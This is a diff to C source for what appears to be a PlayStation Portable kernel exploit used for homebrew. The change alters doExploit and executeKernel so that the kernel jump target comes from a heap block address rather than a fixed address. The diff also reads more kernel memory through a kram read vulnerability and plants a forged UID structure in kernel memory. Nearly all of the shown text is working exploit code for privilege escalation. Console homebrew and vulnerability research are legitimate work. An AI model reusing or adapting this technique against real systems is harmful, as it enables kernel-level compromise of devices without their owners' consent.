@@ -36,6 +36,7 @@ Put together by Acid_Snake and meetpatty.
 UserFunctions* g_tbl = NULL;
 static int libc_clock_offset = LIBC_CLOCK_OFFSET_360;
 static int libc_prev_value = 0;
+static u32 jump_ptr = 0;
 void (*_sceNetMCopyback_1560F143)(uint32_t * a0, uint32_t a1, uint32_t a2, uint32_t a3);
 
 /* Actual code to trigger the kram read vulnerability.
@@ -147,6 +148,9 @@ int doExploit(void) {
     for (int i=0; i<10; i++)
       dummyid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, dummy, PSP_SMEM_High, 0x10, NULL);
 
+    jump_ptr = g_tbl->KernelGetBlockHeadAddr(dummyid) + 4;
+    PRTSTR1("ptr: %p", jump_ptr);
+
     // we can calculate the address of dummy block via its UID and from there calculate where the next block will be
     u32 dummyaddr = 0x88000000 + ((dummyid >> 5) & ~3);
     u32 newaddr = dummyaddr - FAKE_UID_OFFSET;
@@ -154,9 +158,10 @@ int doExploit(void) {
     SceUID encrypted_uid = uid ^ seed; // encrypt UID, if there's none then A^0=A
 
     u32 type_uid = readKram(dummyaddr+8);
+    u32 uid_name = readKram(dummyaddr+16);
 
     // Plant UID data structure into kernel as string
-    u32 string[] = { libc_clock_offset - 4, 0x88888888, type_uid, encrypted_uid, 0x88888888, 0x10101010, 0, 0 };
+    u32 string[] = { libc_clock_offset - 4, KERNELIFY(jump_ptr), type_uid, encrypted_uid, uid_name, 0x1010070A, 0, 0 };
     SceUID plantid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)string, PSP_SMEM_High, 0x10, NULL);
 
     //g_tbl->KernelDcacheWritebackAll();
@@ -176,8 +181,8 @@ int doExploit(void) {
 
 void executeKernel(u32 kernelContentFunction){
   // Make a jump to kernel function
-  _sw(JUMP(KERNELIFY(kernelContentFunction)), 0x08888888);
-  _sw(NOP, 0x08888888+4);
+  _sw(JUMP(KERNELIFY(kernelContentFunction)), jump_ptr);
+  _sw(NOP, jump_ptr+4);
   g_tbl->KernelDcacheWritebackAll();
 
   // Execute kernel function
